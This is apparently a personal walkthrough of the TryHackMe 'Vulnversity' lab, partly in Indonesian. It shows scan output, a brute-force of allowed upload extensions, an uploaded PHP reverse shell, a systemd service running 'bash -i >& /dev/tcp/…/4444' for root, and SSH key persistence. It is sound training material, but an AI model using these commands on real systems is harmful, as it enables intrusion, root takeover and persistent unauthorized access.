room: https://tryhackme.com/room/vulnversity
## Env
```sh
export victim=10.10.23.11
```

### nmap Scan
```sh
nmap -sV $victim
```
output:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 14:26 +08  
Nmap scan report for 10.10.147.196  
Host is up (0.26s latency).  
Not shown: 993 closed tcp ports (conn-refused)  
PORT     STATE    SERVICE     VERSION  
21/tcp   open     ftp         vsftpd 3.0.3  
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)  
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
1007/tcp filtered unknown  
3128/tcp open     http-proxy  Squid http proxy 3.5.12  
3333/tcp open     http        Apache httpd 2.4.18 ((Ubuntu))  
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 47.64 seconds
```

### Gobuster Scan
```sh
gobuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt dir -u "http://$victim:3333/"
```

### FFUF Scan
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://$victim:3333/FUZZ
```
output:
```
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v1.4.1  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://10.10.147.196:3333/FUZZ  
:: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,204,301,302,307,401,403,405,500  
________________________________________________  
  
.htpasswd               [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 254ms]  
.htaccess               [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 3683ms]  
.hta                    [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 3684ms]  
css                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 412ms]  
fonts                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 599ms]  
images                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 416ms]  
index.html              [Status: 200, Size: 33014, Words: 8161, Lines: 653, Duration: 409ms]  
internal                [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 408ms]  
js                      [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 269ms]  
server-status           [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 255ms]  
:: Progress: [4681/4681] :: Job [1/1] :: 145 req/sec :: Duration: [0:00:44] :: Errors: 0 ::
```

### Burpsuite Extention Upload Bruteforce
```sh
echo -e ".php\n.php3\n.php4\n.php5\n.phtml" > phpext.txt
```
- Masukkan payload-nya
- Nonaktifkan URL encode
![](Pasted%20image%2020220418151228.png)

### Reverse Shell
```sh
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
mv ./php-reverse-shell.php ./php-reverse-shell.phtml
```
Rubah IP di file php-reverse-shell.phtml

Attacker:
```sh

curl http://$victim:3333/internal/uploads/php-reverse-shell.phtml
```

Attacker
```sh
nc -lvnp 1234
```

Victim
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
find / -user root -perm -4000 -exec ls -ldb {} \;
```

>Referensi: https://alvinsmith.gitbook.io/progressive-oscp/untitled/vulnversity-privilege-escalation

Victim
```sh
echo "[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.18.90.165/4444 0>&1'

[Install]
WantedBy=multi-user.target" > /var/tmp/root.service

/bin/systemctl enable /var/tmp/root.service

```

Attacker
```ls
nc -lvnp 4444
```

Victim:
```sh
/bin/systemctl start root
```

### Login Via SSH
Attacker:
```sh
cat cat ~/.ssh/authorized_keys
```
Victim:
```sh
echo "<copy the ~/.ssh/authorized_keys (attacker)>" >> ~/.ssh/authorized_keys
```

Attacker:
```sh
ssh root@$victim
```